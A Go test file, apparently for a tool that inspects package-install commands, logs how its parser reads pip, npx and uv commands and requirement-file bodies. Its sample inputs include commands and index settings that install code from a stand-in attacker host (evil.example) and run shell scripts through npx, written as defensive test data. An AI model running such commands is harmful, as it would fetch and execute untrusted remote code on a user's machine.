package installread

import "testing"

// Review of READER-REQFILE-1 (reader-rows, aa5e7f1): the open questions of ADR-0159 round 12 are real. Logs only; it
// fails nowhere, it shows what the reader gives (adopted in round 13; the questions are plan rows).
func TestReviewReqFileOpenQuestions(t *testing.T) {
	for _, line := range []string{
		"pip install git+https://evil.example/x.git",
		"pip install -e git+https://evil.example/x.git#egg=x",
		"pip install https://evil.example/x-1.0-py3-none-any.whl",
		"npx -sc 'sh x.sh' zz-pkg",
		"npx -c 'sh x.sh' zz-pkg",
	} {
		tg, un, _, subst := ParseLine(line)
		t.Logf("line %-60q targets %v unread %v extra %v", line, tg, un, HookExtra(line, tg, un, subst))
	}
	for _, body := range []string{
		"-e git+https://evil.example/x.git#egg=x\n",
		"https://evil.example/x-1.0-py3-none-any.whl\n",
		"zz @ https://evil.example/zz-1.0.tar.gz\n",
		"[[tool.uv.index]]\nname = \"zz\"\nurl = \"https://evil.example/simple\"\ndefault = true\n",
		"[project]\ndependencies = [\"zz\"]\n[tool.uv.sources]\nzz = { index = \"zz\" }\n",
	} {
		r, f := ReqFileReasons([]byte(body), nil)
		t.Logf("file %-70q reasons %v files %v", body, r, f)
	}
	for _, line := range []string{"pip install -r ~/r.txt", "uv --directory sub pip install -r r.txt", "env -C sub pip install -r r.txt"} {
		t.Logf("files of %q: %v", line, RequirementFiles(line))
	}
}
